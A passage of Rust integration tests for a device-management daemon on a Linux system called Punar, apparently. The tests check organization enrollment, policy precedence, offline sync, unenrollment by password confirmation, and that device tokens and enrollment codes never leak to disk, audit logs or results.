    assert_eq!(body["os"]["id"], "punar");
    assert!(matches!(
        body["os"]["architecture"].as_str(),
        Some("x86_64" | "aarch64")
    ));
    assert_eq!(body["kernel"], "6.12.0-punar");
    // Which capabilities exist, never what they observe: a value is not a
    // state, and it never leaves the device.
    assert_eq!(
        body["capabilities"],
        json!([{"capability": "security.firewall", "supported": true}])
    );

    assert_eq!(
        body["posture"],
        json!({
            "secure_boot": false,
            "uefi": true,
            "tpm_present": true,
            "tpm_version": "2.0",
            "is_virtual": true,
            "virtualization": null,
            "disk_encryption_enabled": true,
            "firewall_enabled": true,
            "firewall": "nftables",
            // No verified channel check has run on this device.
            "os_patch_status": "unknown",
            "reboot_required": false,
        })
    );
    let hardware = &body["hardware"];
    assert_eq!(
        sorted_keys(hardware),
        [
            "battery_present",
            "bios_version",
            "cpu_cores",
            "cpu_model",
            "cpu_threads",
            "cpu_vendor",
            "device_capacity_bytes",
            "manufacturer",
            "memory_total_bytes",
            "model_name",
            "root_filesystem_type"
        ]
    );
    assert_eq!(hardware["manufacturer"], "QEMU");
    assert_eq!(hardware["model_name"], "Standard PC (Q35 + ICH9, 2009)");
    assert_eq!(hardware["cpu_vendor"], "AuthenticAMD");
    assert_eq!(hardware["cpu_cores"], 4);
    assert_eq!(hardware["cpu_threads"], 4);
    assert_eq!(hardware["memory_total_bytes"], 8_192_000u64 * 1024);
    assert_eq!(hardware["root_filesystem_type"], "erofs");
    assert_eq!(hardware["battery_present"], false);
    assert_eq!(
        hardware["device_capacity_bytes"].as_u64().unwrap() % 1_000_000_000,
        0
    );

    // The image's first-party entry and its browser — never Debian's own
    // entries, never a Flatpak the person installed.
    assert_eq!(
        body["applications"],
        json!([
            {"name": "chromium", "display_name": "Chromium", "version": "151.0.7922.173-1",
             "source": "punar-image", "managed": false},
            {"name": "org.punar.Mail", "display_name": "Mail", "version": null,
             "source": "punar-image", "managed": false},
        ])
    );
    let text = body.to_string();
    for forbidden in [FIXTURE_SERIAL, "firefox", "Thunar", "/home"] {
        assert!(
            !text.contains(forbidden),
            "the inventory carries {forbidden}"
        );
    }
}

// ---------------------------------------------------------------------------
// The lifecycle
// ---------------------------------------------------------------------------

#[test]
fn enroll_lifecycle_org_wins_sync_flows_offline_survives_unenroll_restores() {
    let dir = test_dir("lifecycle");
    let control_plane = ControlPlane::start(&dir);
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "disabled");
    let device_id = fs::read_to_string(daemon.state_path("device-id"))
        .unwrap()
        .trim()
        .to_string();

    // Pre-state: personal, no org anywhere, summary file says so.
    assert_eq!(
        daemon.result("enroll.status", None),
        json!({"enrolled": false})
    );
    let status = daemon.result("status", None);
    assert_eq!(status["mode"], "personal");
    assert_eq!(status["enrolled"], false);
    assert!(status.get("org").is_none(), "org absent, never null");
    assert!(policy_d_files(&daemon).is_empty());
    let summary = daemon.status_summary();
    assert_eq!(summary["enrolled"], false);
    assert_eq!(summary["org_name"], Value::Null);

    // Record a personal preference (rank 5): firewall disabled. The mock
    // capability observes "disabled", so this is an idempotent no-op.
    let set = daemon.result(
        "capabilities.set",
        Some(json!({"capability": "security.firewall", "desired_state": "disabled"})),
    );
    assert_eq!(set["changed"], false);
    assert!(
        set.get("overridden").is_none(),
        "personal mode: no override"
    );

    // Enroll.
    let enrolled = daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));
    assert_eq!(enrolled["enrolled"], true);
    assert_eq!(enrolled["org"]["id"], "acme");
    assert_eq!(enrolled["org"]["name"], "Acme");
    assert_eq!(enrolled["org"]["display_name"], "Acme Engineering");
    assert_eq!(enrolled["org"]["domain"], "acme.com");
    assert_eq!(enrolled["policy_ids"], json!(["eng-baseline-v12"]));
    // The honesty label travels with the data.
    assert_eq!(enrolled["attestation"], "simulated");
    assert_eq!(enrolled["first_sync"]["compliance"], "success");
    assert_eq!(enrolled["first_sync"]["inventory"], "success");

    // Files and modes: 0600 stores, the envelope carries its embedded
    // payload, and the token is not inside enrollment.json.
    assert_eq!(mode_of(&daemon.state_path("enrollment.json")), 0o600);
    assert_eq!(mode_of(&daemon.state_path("device-token")), 0o600);
    let token = fs::read_to_string(daemon.state_path("device-token"))
        .unwrap()
        .trim()
        .to_string();
    assert!(token.starts_with("tok_"));
    assert!(
        !fs::read_to_string(daemon.state_path("enrollment.json"))
            .unwrap()
            .contains(&token)
    );
    assert_eq!(policy_d_files(&daemon), ["eng-baseline-v12.json"]);
    let drop_path = daemon.state_path("policy.d").join("eng-baseline-v12.json");
    assert_eq!(mode_of(&drop_path), 0o600);
    let envelope: Value = serde_json::from_str(&fs::read_to_string(&drop_path).unwrap()).unwrap();
    assert_eq!(envelope["policy"]["kind"], "DeviceDesiredState");
    assert_eq!(envelope["source_name"], "Acme Engineering Baseline");

    // SPEC section 40 managed explain, now real: org rank 2 beats the
    // recorded personal preference; override not permitted.
    let explain = daemon.result("policy.explain", Some(json!({"path": "security.firewall"})));
    assert_eq!(explain["effective_value"], "enabled");
    assert_eq!(explain["source"]["kind"], "organization_baseline");
    assert_eq!(explain["source"]["rank"], 2);
    assert_eq!(explain["source"]["policy_id"], "eng-baseline-v12");
    assert_eq!(explain["source"]["name"], "Acme Engineering Baseline");
    assert_eq!(explain["user_override_permitted"], false);

    // status flips additively to managed.
    let status = daemon.result("status", None);
    assert_eq!(status["mode"], "managed");
    assert_eq!(status["enrolled"], true);
    assert_eq!(status["org"]["id"], "acme");
    let summary = daemon.status_summary();
    assert_eq!(summary["enrolled"], true);
    assert_eq!(summary["org_name"], "Acme Engineering");
    assert_eq!(summary["compliance_overall"], "compliant");

    // Received side (the check-the-receiver principle): one compliance
    // report and one inventory from the enrollment pass, both in the
    // privacy shape.
    {
        let compliance = control_plane.state.compliance.lock().unwrap();
        assert_eq!(compliance.len(), 1);
        assert_compliance_shape(&compliance[0], &device_id);
        assert_eq!(compliance[0]["report"]["overall"], "compliant");
    }
    {
        let inventory = control_plane.state.inventory.lock().unwrap();
        assert_eq!(inventory.len(), 1);
        assert_personal_inventory(&inventory[0]["inventory"]);
    }
    // A personal enrollment never lists the system installation.
    assert!(
        !dir.join("machine/flatpak-argv").exists(),
        "flatpak never ran"
    );
    // The person's record of what left: exactly what the control plane
    // received (this one keeps the inventory itself), and no secret.
    let view_path = daemon.state_path("organization-view.json");
    assert_eq!(mode_of(&view_path), 0o640);
    let view = read_json(&view_path);
    assert_eq!(
        view["sent"],
        control_plane.state.inventory.lock().unwrap()[0]["inventory"]
    );
    assert!(
        !view.to_string().contains(&token),
        "the view leaked the token"
    );

    // Recorded-but-overridden (the verified M4 semantics, now reachable):
    // a root set of `disabled` on the pinned path records the preference,
    // keeps the org value, exits successfully.
    let set = daemon.result(
        "capabilities.set",
        Some(json!({"capability": "security.firewall", "desired_state": "disabled"})),
    );
    assert_eq!(set["changed"], false);
    assert_eq!(set["overridden"], true);
    assert_eq!(set["effective_state"], "enabled");
    let noop_event = daemon
        .audit_events()
        .into_iter()
        .rev()
        .find(|e| e["action"] == "capabilities.set" && e["result"] == "noop")
        .expect("the overridden set audits as noop");
    assert_eq!(noop_event["policy_ids"], json!(["eng-baseline-v12"]));

    // Deliberately re-record `enabled` so the post-unenroll personal state
    // is firewall-enabled (the resurfacing witness, milestone-5.md § 5.4).
    daemon.result(
        "capabilities.set",
        Some(json!({"capability": "security.firewall", "desired_state": "enabled"})),
    );

    // A reconcile pass syncs compliance again; the inventory is hash-gated
    // and must NOT be resent.
    daemon.result("reconcile", None);
    assert_eq!(control_plane.state.compliance.lock().unwrap().len(), 2);
    assert_eq!(control_plane.state.inventory.lock().unwrap().len(), 1);

    // Offline (SPEC section 55): the control plane dies; local policy
    // stays enforceable from the cached org layer; sync queues.
    let state = control_plane.stop();
    let report = daemon.result("reconcile", None);
    assert_eq!(report["compliance"]["overall"], "compliant");
    let enroll_status = daemon.result("enroll.status", None);
    // The control plane here is the built-in agent's socket, on this device:
    // one that is gone is management interrupted, told apart from the
    // network, and audited once for the episode. The network was never
    // asked, so no sync was attempted: last_sync keeps the last one, the
    // reports wait, and no enroll.sync outage is recorded.
    assert_eq!(enroll_status["last_sync"]["result"], "success");
    assert_eq!(enroll_status["last_sync"]["pending"], true);
    assert_eq!(enroll_status["attestation"], "simulated");
    let sync_events = |daemon: &TestDaemon| {
        daemon
            .audit_events()
            .iter()
            .filter(|e| e["action"] == "enroll.sync")
            .count()
    };
    assert_eq!(sync_events(&daemon), 0);
    assert_eq!(enroll_status["management"]["state"], "interrupted");
    assert_eq!(enroll_status["management"]["reason"], "socket_missing");
    assert_eq!(daemon.status_summary()["management"], "interrupted");
    // A second failing pass adds no second episode event (transitions
    // only, never per-retry spam).
    daemon.result("reconcile", None);
    assert_eq!(sync_events(&daemon), 0);
    assert_eq!(
        agent_events(&daemon),
        [(
            "agent_unavailable".to_string(),
            "agent.socket_missing".to_string()
        )]
    );
    assert_eq!(
        state.compliance.lock().unwrap().len(),
        2,
        "nothing received while down"
    );

    // Recovery: restart on the same socket with the same state; exactly
    // one new compliance line (latest-wins queue — a flag, not a spool).
    let control_plane = ControlPlane::start_with(&dir, state);
    daemon.result("reconcile", None);
    let enroll_status = daemon.result("enroll.status", None);
    assert_eq!(enroll_status["last_sync"]["result"], "success");
    assert_eq!(enroll_status["last_sync"]["pending"], false);
    assert_eq!(control_plane.state.compliance.lock().unwrap().len(), 3);
    assert_eq!(control_plane.state.inventory.lock().unwrap().len(), 1);
    assert_eq!(
        sync_events(&daemon),
        0,
        "the agent's episode is not an outage"
    );
    assert_eq!(enroll_status["management"], json!({"state": "active"}));
    assert_eq!(daemon.status_summary()["management"], "active");
    assert_eq!(
        agent_events(&daemon),
        [
            (
                "agent_unavailable".to_string(),
                "agent.socket_missing".to_string()
            ),
            ("success".to_string(), "agent.socket_missing".to_string())
        ]
    );

    // Unenroll — deliberately with the control plane DOWN: local restore
    // needs no counterparty.
    let state = control_plane.stop();
    let stopped = daemon.result("enroll.stop", None);
    assert_eq!(stopped["enrolled"], false);
    assert_eq!(stopped["removed_policy_ids"], json!(["eng-baseline-v12"]));
    assert!(policy_d_files(&daemon).is_empty());
    assert!(!daemon.state_path("enrollment.json").exists());
    assert!(
        !view_path.exists(),
        "the view describes an enrollment that has ended"
    );
    // The agent never confirmed it wiped the identity, so its token stays
    // and says so: an unenrollment is never finished by forgetting a key
    // that is still on disk.
    assert_eq!(stopped["identity_release"], "pending");
    assert!(daemon.state_path("device-token").exists());
    assert_eq!(
        daemon.result("enroll.status", None)["identity_release"]["state"],
        "pending"
    );

    // Personal state restored — and the preference recorded while
    // overridden is the winner again (SPEC section 39).
    let explain = daemon.result("policy.explain", Some(json!({"path": "security.firewall"})));
    assert_eq!(explain["source"]["kind"], "local_user_preference");
    assert_eq!(explain["source"]["rank"], 5);
    assert_eq!(explain["source"]["name"], "Personal preference");
    assert_eq!(explain["user_override_permitted"], true);
    assert_eq!(explain["effective_value"], "enabled");
    let status = daemon.result("status", None);
    assert_eq!(status["mode"], "personal");
    assert_eq!(status["enrolled"], false);
    assert!(status.get("org").is_none());
    let summary = daemon.status_summary();
    assert_eq!(summary["enrolled"], false);
    assert_eq!(summary["org_name"], Value::Null);

    // The mock keeps its history (unenrollment is local; the past is not
    // retracted) — and no further reports arrive.
    assert_eq!(state.compliance.lock().unwrap().len(), 3);
    daemon.result("reconcile", None);
    assert_eq!(state.compliance.lock().unwrap().len(), 3);

    // The agent back: the next pass asks it again to wipe the identity, and
    // once it confirms, the token goes and the release is audited. Nothing
    // else is sent: a personal device reports nothing.
    let control_plane = ControlPlane::start_with(&dir, state);
    control_plane.state.methods.lock().unwrap().clear();
    daemon.result("reconcile", None);
    assert_eq!(
        *control_plane.state.methods.lock().unwrap(),
        ["enroll.unregister"]
    );
    assert!(!daemon.state_path("device-token").exists());
    assert!(
        daemon
            .result("enroll.status", None)
            .get("identity_release")
            .is_none()
    );
    let releases: Vec<String> = daemon
        .audit_events()
        .iter()
        .filter(|e| e["action"] == "enroll.release")
        .map(|e| e["result"].as_str().unwrap().to_string())
        .collect();
    assert_eq!(releases, ["pending", "success"]);
    daemon.result("reconcile", None);
    assert_eq!(
        control_plane.state.methods.lock().unwrap().len(),
        1,
        "nothing more"
    );

    // Audit lifecycle: enroll.start success citing the org policy,
    // enroll.stop success, both sync transitions.
    let events = daemon.audit_events();
    let start_event = events
        .iter()
        .find(|e| e["action"] == "enroll.start" && e["result"] == "success")
        .expect("enroll.start audited");
    assert_eq!(start_event["resource"], "enrollment");
    assert_eq!(start_event["policy_ids"], json!(["eng-baseline-v12"]));
    let stop_event = events
        .iter()
        .find(|e| e["action"] == "enroll.stop" && e["result"] == "success")
        .expect("enroll.stop audited");
    assert_eq!(stop_event["policy_ids"], json!(["eng-baseline-v12"]));

    // SPEC sections 1.19/53: the device token appears in NOTHING — not the
    // audit trail, not the summary file, not the effective-document debug
    // copy, not any result surfaced above.
    assert!(!token.is_empty());
    assert!(!daemon.audit_text().contains(&token));
    for artifact in ["status.json", "effective.json", "preferences.json"] {
        let content = fs::read_to_string(daemon.state_path(artifact)).unwrap_or_default();
        assert!(!content.contains(&token), "{artifact} leaked the token");
    }
    for surfaced in [&enrolled, &status, &enroll_status, &stopped] {
        assert!(!surfaced.to_string().contains(&token));
    }
}

/// A ticket exactly as punar-authd mints one: an empty 0600 file named by the
/// token, in a 0700 directory named by the uid that proved its password.
fn mint_ticket(dir: &Path, uid: u32, token: &str) -> PathBuf {
    use std::os::unix::fs::DirBuilderExt;
    let per_uid = dir.join("tickets").join(uid.to_string());
    fs::DirBuilder::new()
        .recursive(true)
        .mode(0o700)
        .create(&per_uid)
        .unwrap();
    let path = per_uid.join(token);
    fs::File::create(&path).unwrap();
    path
}

const TICKET: &str = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";

fn person() -> Peer {
    Peer {
        uid: 1000,
        gid: 1000,
        pid: None,
    }
}

/// No account on a Punar device holds sudo and root is locked, so a person
/// enrolls by confirming their password. A request without that confirmation
/// is refused before anything leaves the device, and unenrolling stays
/// root-only.
#[test]
fn a_person_without_a_password_confirmation_cannot_enroll() {
    let dir = test_dir("authz");
    let state = Arc::new(ControlPlaneState::default());
    let control_plane = ControlPlane::start_with(&dir, state.clone());
    let daemon = TestDaemon::start(&dir, person(), &control_plane.socket, "enabled");

    let error = daemon.error("enroll.start", Some(json!({"org_domain": "acme.com"})));
    assert_eq!(error["code"], "denied");
    assert_eq!(error["details"]["reason"], "reauthentication_required");
    let message = error["message"].as_str().unwrap();
    assert!(message.contains("needs your password"), "{message}");
    assert!(
        !message.contains("sudo"),
        "no account on a Punar device can use sudo, so the refusal must not suggest it"
    );
    assert!(
        state.methods.lock().unwrap().is_empty(),
        "nothing may leave the device for an unconfirmed caller"
    );
    let error = daemon.error("enroll.stop", None);
    assert_eq!(error["code"], "denied");
    // Both denials audited; the read stays open.
    let events = daemon.audit_events();
    assert!(
        events
            .iter()
            .any(|e| e["action"] == "enroll.start" && e["decision"] == "deny")
    );
    assert!(
        events
            .iter()
            .any(|e| e["action"] == "enroll.stop" && e["decision"] == "deny")
    );
    assert_eq!(
        daemon.result("enroll.status", None),
        json!({"enrolled": false})
    );
    // Nothing was written.
    assert!(!daemon.state_path("enrollment.json").exists());
    assert!(!daemon.state_path("device-token").exists());
}

#[test]
fn unreachable_control_plane_fails_enrollment_with_no_trace() {
    let dir = test_dir("unreachable");
    let daemon = TestDaemon::start(
        &dir,
        Peer::root(),
        &dir.join("no-such-control-plane.sock"),
        "enabled",
    );

    let error = daemon.error("enroll.start", Some(json!({"org_domain": "acme.com"})));
    assert_eq!(error["code"], "upstream_unreachable");
    assert_eq!(error["details"]["stage"], "discover");
    assert!(error["message"].as_str().unwrap().contains("Next step"));

    assert!(!daemon.state_path("enrollment.json").exists());
    assert!(!daemon.state_path("device-token").exists());
    assert!(policy_d_files(&daemon).is_empty());
    assert_eq!(
        daemon.result("enroll.status", None),
        json!({"enrolled": false})
    );
}

#[test]
fn conflicts_unknown_domains_and_bad_domains_are_typed_errors() {
    let dir = test_dir("conflict");
    let control_plane = ControlPlane::start(&dir);
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");

    // Not enrolled yet: stop is a conflict.
    let error = daemon.error("enroll.stop", None);
    assert_eq!(error["code"], "conflict");
    assert_eq!(error["details"]["state"], "personal");

    // Malformed domain: rejected before any network hop.
    let error = daemon.error("enroll.start", Some(json!({"org_domain": "not a domain"})));
    assert_eq!(error["code"], "invalid_params");

    // Unknown (but well-formed) domain: the control plane's not_found.
    let error = daemon.error(
        "enroll.start",
        Some(json!({"org_domain": "unknown.example"})),
    );
    assert_eq!(error["code"], "invalid_params");
    assert_eq!(error["details"]["param"], "org_domain");

    // Enroll, then a second enroll is a conflict.
    daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));
    let error = daemon.error("enroll.start", Some(json!({"org_domain": "acme.com"})));
    assert_eq!(error["code"], "conflict");
    assert_eq!(error["details"]["state"], "enrolled");
}

/// An organization can turn local policy editing off — and unenrolling must
/// give it back.
///
/// THE BUG THIS CLOSES was an outlived opinion. `enroll.stop` cleared the org
/// layers and the application policy but not the local-admin veto, so the
/// device's owner stayed locked out of their own machine by a policy whose
/// files had just been deleted, citing an organization it was no longer
/// enrolled with, until punard happened to restart.
#[test]
fn an_organization_can_deny_local_policy_editing_and_unenrolling_gives_it_back() {
    let dir = test_dir("localadmin");
    let control_plane = ControlPlane::start(&dir);
    control_plane
        .state
        .deny_local_admin
        .store(true, Ordering::SeqCst);
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");

    // Before enrollment the owner administers the device.
    let effective = daemon.result("policy.effective", None);
    assert_eq!(effective["local_admin"]["allowed"], true);

    daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));

    let effective = daemon.result("policy.effective", None);
    assert_eq!(effective["local_admin"]["allowed"], false);
    assert_eq!(
        effective["local_admin"]["source"]["policy_id"],
        "eng-baseline-v12"
    );
    // Even root is refused, and the refusal names who decided.
    let error = daemon.error(
        "policy.set",
        Some(json!({
            "capability": "security.firewall",
            "value": "disabled",
            "reason": "the lab bench machines run without it"
        })),
    );
    assert_eq!(error["code"], "denied");
    assert_eq!(error["details"]["reason"], "local_admin_disabled");
    assert!(
        error["message"]
            .as_str()
            .unwrap()
            .contains("eng-baseline-v12"),
        "{error}"
    );

    // Unenroll — and the veto goes with the layers it arrived with, in this
    // running daemon, without waiting for a restart.
    daemon.result("enroll.stop", None);
    let effective = daemon.result("policy.effective", None);
    assert_eq!(effective["local_admin"]["allowed"], true);
    assert!(effective["local_admin"].get("source").is_none());

    let set = daemon.result(
        "policy.set",
        Some(json!({
            "capability": "security.firewall",
            "value": "disabled",
            "reason": "the lab bench machines run without it"
        })),
    );
    assert_eq!(set["capability"], "security.firewall");
    assert_eq!(set["pinned_value"], "disabled");
    assert_eq!(set["effective_value"], "disabled");
    assert_eq!(set["source"]["kind"], "device_specific_override");
}

#[test]
fn invalid_policy_envelope_aborts_enrollment_atomically() {
    let dir = test_dir("badpolicy");
    let control_plane = ControlPlane::start(&dir);
    control_plane
        .state
        .serve_bad_policy
        .store(true, Ordering::SeqCst);
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "enabled");

    let error = daemon.error("enroll.start", Some(json!({"org_domain": "acme.com"})));
    assert_eq!(error["code"], "invalid_params");
    assert!(
        error["message"]
            .as_str()
            .unwrap()
            .contains("failed validation")
    );
    // All-or-nothing: the rejected enrollment left nothing behind.
    assert!(policy_d_files(&daemon).is_empty());
    assert!(!daemon.state_path("enrollment.json").exists());
    assert!(!daemon.state_path("device-token").exists());
    assert_eq!(
        daemon.result("enroll.status", None),
        json!({"enrolled": false})
    );
    // The rejection is audited as a failed enroll.start.
    assert!(
        daemon
            .audit_events()
            .iter()
            .any(|e| e["action"] == "enroll.start" && e["result"] == "failure")
    );
    // And the identity the control plane issued at register was released,
    // so neither side is left holding a device the other has forgotten.
    let methods = control_plane.state.methods.lock().unwrap().clone();
    assert_eq!(
        methods,
        vec![
            "org.discover",
            "enroll.register",
            "policy.fetch",
            "enroll.unregister"
        ]
    );
    assert!(control_plane.state.devices.lock().unwrap().is_empty());

    // The same daemon can enroll once the control plane behaves.
    control_plane
        .state
        .serve_bad_policy
        .store(false, Ordering::SeqCst);
    let enrolled = daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));
    assert_eq!(enrolled["enrolled"], true);
}

#[test]
fn enrollment_persists_across_restart_and_non_root_set_cites_the_org_policy() {
    let dir = test_dir("restart");
    let control_plane = ControlPlane::start(&dir);
    {
        let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "disabled");
        daemon.result("enroll.start", Some(json!({"org_domain": "acme.com"})));
        daemon.stop();
    }

    // A fresh daemon on the same state dir — the SPEC section 55 shape:
    // enrollment, policy.d, and the token are plain files; nothing about
    // them depends on the control plane being alive. This daemon sees
    // non-root peers.
    let daemon = TestDaemon::start(
        &dir,
        Peer {
            uid: 1000,
            gid: 1000,
            pid: None,
        },
        &control_plane.socket,
        "enabled",
    );
    let status = daemon.result("status", None);
    assert_eq!(status["mode"], "managed");
    assert_eq!(status["org"]["display_name"], "Acme Engineering");

    // Non-root set on the org-pinned path: denied (exit 3 client-side),
    // and the M5 amendment cites the pinning org policy — not the false
    // "personal defaults" citation.
    let error = daemon.error(
        "capabilities.set",
        Some(json!({"capability": "security.firewall", "desired_state": "disabled"})),
    );
    assert_eq!(error["code"], "denied");
    let message = error["message"].as_str().unwrap();
    assert!(message.contains("Acme Engineering Baseline"), "{message}");
    assert!(message.contains("eng-baseline-v12"), "{message}");
    assert!(message.contains("not permitted"), "{message}");
    assert!(!message.contains("personal defaults"), "{message}");
    assert_eq!(error["details"]["policy_ids"], json!(["eng-baseline-v12"]));
    // The denial's audit event cites the pinning policy too.
    let denial = daemon
        .audit_events()
        .into_iter()
        .rev()
        .find(|e| e["action"] == "capabilities.set" && e["decision"] == "deny")
        .expect("denial audited");
    assert_eq!(denial["policy_ids"], json!(["eng-baseline-v12"]));

    // An unpinned capability id keeps the M3/M4 denial byte-identical in
    // spirit: "personal defaults" citation (no org policy governs it).
    let error = daemon.error(
        "capabilities.set",
        Some(json!({"capability": "mock.unpinned", "desired_state": "x"})),
    );
    // Unknown capability → not_found before authz? The registry lookup
    // runs first; assert only that no org policy is cited.
    assert!(
        !error["message"]
            .as_str()
            .unwrap()
            .contains("Acme Engineering"),
        "{error}"
    );
}

/// The enrollment code (a Smplify enrollment token) travels from the
/// `enroll.start` params to exactly one place — the control plane's
/// `enroll.register` — and is never written to the state directory, the
/// audit trail, or the result (SPEC section 49; ipc.md section 5.9).
#[test]
fn the_enrollment_code_reaches_the_control_plane_and_nowhere_else() {
    let dir = test_dir("code");
    let state = Arc::new(ControlPlaneState::default());
    let control_plane = ControlPlane::start_with(&dir, state.clone());
    let daemon = TestDaemon::start(&dir, Peer::root(), &control_plane.socket, "disabled");
    let code = "lex_test-code-never-on-disk-7f3a";
    let result = daemon.result(
        "enroll.start",
        Some(json!({"org_domain": "acme.com", "code": code})),
    );
    assert_eq!(result["org"]["display_name"], "Acme Engineering");
    assert_eq!(
        *state.codes.lock().unwrap(),
        vec![Some(code.to_string())],
        "the register call carries the code verbatim"
    );
    assert!(
        !result.to_string().contains(code),
        "enroll.start must never echo the code"
    );
    assert!(
        !daemon
            .result("enroll.status", None)
            .to_string()
            .contains(code),
        "enroll.status must never expose the code"
    );
    daemon.stop();
    // Nothing on disk — state, policy.d, audit — may contain the code.
    fn walk(dir: &Path, needle: &str, hits: &mut Vec<PathBuf>) {
        for entry in std::fs::read_dir(dir).unwrap().flatten() {
            let path = entry.path();
            if path.is_dir() {
                walk(&path, needle, hits);
            } else if let Ok(bytes) = std::fs::read(&path) {
                if bytes.windows(needle.len()).any(|w| w == needle.as_bytes()) {
                    hits.push(path);
                }
            }
        }
    }
    let mut hits = Vec::new();
    walk(&dir, code, &mut hits);
    assert!(hits.is_empty(), "the code leaked to disk: {hits:?}");
}

/// The first account on a Punar device enrolls it the way a Mac administrator
/// does: the code, then their own password. The ticket punar-authd minted for
/// that password is spent by the call, and stored or forwarded nowhere. A
/// spent ticket on an enrolled device is refused as a spent ticket, never
/// recorded as an allowed attempt. The same person unenrolls with a fresh
/// confirmation.
#[test]
fn a_person_enrolls_and_unenrolls_by_confirming_their_password() {
    let dir = test_dir("person");
    let state = Arc::new(ControlPlaneState::default());
    let control_plane = ControlPlane::start_with(&dir, state.clone());
    let daemon = TestDaemon::start(&dir, person(), &control_plane.socket, "disabled");
    let ticket = mint_ticket(&dir, 1000, TICKET);

    let result = daemon.result(
        "enroll.start",
        Some(json!({"org_domain": "acme.com", "code": "lex_person", "ticket": TICKET})),
    );
    assert_eq!(result["org"]["display_name"], "Acme Engineering");
    assert!(!ticket.exists(), "the ticket was spent, not merely checked");
    assert_eq!(daemon.result("enroll.status", None)["enrolled"], true);
    // An organization document that states no removal term leaves the
    // device removable, and says so; one that states no ownership leaves it
    // personal.
    assert_eq!(result["removable"], true);
    assert_eq!(daemon.result("enroll.status", None)["removable"], true);
    assert_eq!(result["organization_owned"], false);
    assert_eq!(
        daemon.result("enroll.status", None)["organization_owned"],
        false
    );
    let allowed = |daemon: &TestDaemon| {
        daemon
            .audit_events()
            .iter()
            .filter(|e| {
                e["action"] == "enroll.start" && e["user_id"] == "punar" && e["decision"] != "deny"
            })
            .count()
    };
    assert!(
        allowed(&daemon) >= 1,
        "the enrollment is attributed to the person who confirmed it"
    );

    // Replaying the spent ticket on the enrolled device: refused for the
    // ticket, before the conflict, and never audited as allowed.
    let before = allowed(&daemon);
    let error = daemon.error(
        "enroll.start",
        Some(json!({"org_domain": "acme.com", "ticket": TICKET})),
    );
    assert_eq!(error["details"]["reason"], "reauthentication_missing");
    assert_eq!(allowed(&daemon), before);

    // Unenrolling takes a fresh confirmation, and spends it.
    let error = daemon.error("enroll.stop", None);
    assert_eq!(error["details"]["reason"], "reauthentication_required");
    const SECOND: &str = "fedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210";
    let second = mint_ticket(&dir, 1000, SECOND);
    let stopped = daemon.result("enroll.stop", Some(json!({"ticket": SECOND})));
    assert_eq!(stopped["enrolled"], false);
    assert!(!second.exists());
    assert!(
        !daemon.state_path("enrollment-terms.json").exists(),
        "unenrolling removes the removal term with the enrollment"
    );
    assert_eq!(daemon.result("enroll.status", None)["enrolled"], false);
    daemon.stop();

    // Neither ticket reached anything but punard: not the control plane,
    // not the audit trail, not the state directory.
    for token in [TICKET, SECOND] {
        assert!(
            state
                .lines
                .lock()
                .unwrap()
                .iter()
                .all(|l| !l.contains(token)),
            "a ticket reached the control plane"
        );
        let mut hits = Vec::new();
        for place in [dir.clone(), dir.join("state")] {
            for entry in fs::read_dir(&place).unwrap().flatten() {
                let path = entry.path();
                if path.is_file()
                    && fs::read(&path)
                        .map(|b| b.windows(token.len()).any(|w| w == token.as_bytes()))
                        .unwrap_or(false)
                {
                    hits.push(path);
                }
            }
        }
        assert!(hits.is_empty(), "a ticket leaked to disk: {hits:?}");
    }
}

/// Every refusal a person meets on the way through enrollment must point
/// somewhere they can go: no account on a Punar device is root.
fn assert_no_root_advice(message: &str) {
    assert!(!message.contains("sudo"), "{message}");
    assert!(!message.contains("as root"), "{message}");
}

/// An organization can keep its device — but only by saying so in its
/// organization document, and only with the enrolling person's explicit yes,
/// asked for before the organization ever hears of the device. Once given,
/// the term binds every local caller, root included, survives a restart, and
/// never costs a password to be told.
#[test]
fn a_non_removable_enrollment_needs_the_persons_yes_and_then_binds_everyone() {
    let dir = test_dir("nonremovable");
    let state = Arc::new(ControlPlaneState::default());
    *state.org_removable.lock().unwrap() = Some(json!(false));
    let control_plane = ControlPlane::start_with(&dir, state.clone());
    let daemon = TestDaemon::start(&dir, person(), &control_plane.socket, "disabled");

    // Not accepted: refused after discovery and before register, so the
    // organization never learns of a device that did not enroll.
    let ticket = mint_ticket(&dir, 1000, TICKET);
    let error = daemon.error(
        "enroll.start",
        Some(json!({"org_domain": "acme.com", "code": "lex_terms", "ticket": TICKET})),
    );
    assert_eq!(error["code"], "denied", "{error}");
    assert_eq!(error["details"]["reason"], "non_removable_not_accepted");
    assert_eq!(error["details"]["organization_name"], "Acme Engineering");
    let message = error["message"].as_str().unwrap();
    assert!(message.contains("--accept-non-removable"), "{message}");
    assert_no_root_advice(message);
    assert!(!ticket.exists(), "the confirmation paid for discovery");
    assert_eq!(*state.methods.lock().unwrap(), vec!["org.discover"]);
    assert!(
        state
            .lines
            .lock()
            .unwrap()
            .iter()
            .all(|l| !l.contains("lex_terms")),
        "the code never left the device"
    );
    assert_eq!(daemon.result("enroll.status", None)["enrolled"], false);
    assert!(!daemon.state_path("enrollment.json").exists());

    // Accepted.
    mint_ticket(&dir, 1000, TICKET);
    let enrolled = daemon.result(
        "enroll.start",
        Some(json!({
            "org_domain": "acme.com",
            "ticket": TICKET,
            "accept_non_removable": true
        })),
    );
    assert_eq!(enrolled["removable"], false);
    assert_eq!(daemon.result("enroll.status", None)["removable"], false);

    // Now nobody on the device can unenroll it, and a person is told so
    // before a password could matter: with or without one, their ticket
    // stays unspent.
    const SECOND: &str = "fedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210";
    let second = mint_ticket(&dir, 1000, SECOND);
    for params in [None, Some(json!({"ticket": SECOND}))] {
        let error = daemon.error("enroll.stop", params);
        assert_eq!(error["code"], "denied");
        assert_eq!(error["details"]["reason"], "enrollment_not_removable");
        assert_eq!(error["details"]["organization"], "acme");
        let message = error["message"].as_str().unwrap();
        assert!(message.contains("erasing and reinstalling"), "{message}");
